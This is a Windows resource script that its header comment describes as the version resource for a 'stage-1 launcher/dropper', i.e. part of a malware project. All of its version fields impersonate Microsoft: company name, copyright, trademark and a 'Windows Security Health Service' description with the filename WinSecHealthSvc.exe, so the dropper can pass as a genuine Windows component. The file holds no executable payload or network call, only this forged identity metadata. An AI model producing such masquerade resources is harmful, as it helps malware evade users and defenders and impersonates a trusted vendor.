// launcher.rc — Version resource for the stage-1 launcher/dropper.
// Presents as "Windows Security Health Service" — a real Windows component name.
#include <windows.h>

VS_VERSION_INFO VERSIONINFO
FILEVERSION     10, 0, 22621, 2506
PRODUCTVERSION  10, 0, 22621, 2506
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0x0L
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows Security Health Service"
            VALUE "FileVersion",      "10.0.22621.2506 (WinBuild.160101.0800)"
            VALUE "InternalName",     "WinSecHealthSvc"
            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
            VALUE "LegalTrademarks",  "Microsoft\256 is a registered trademark of Microsoft Corporation."
            VALUE "OriginalFilename", "WinSecHealthSvc.exe"
            VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
            VALUE "ProductVersion",   "10.0.22621.2506"
            VALUE "Comments",         "Windows Security Health monitoring and reporting service."
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END

1 24 "resources/launcher.manifest"
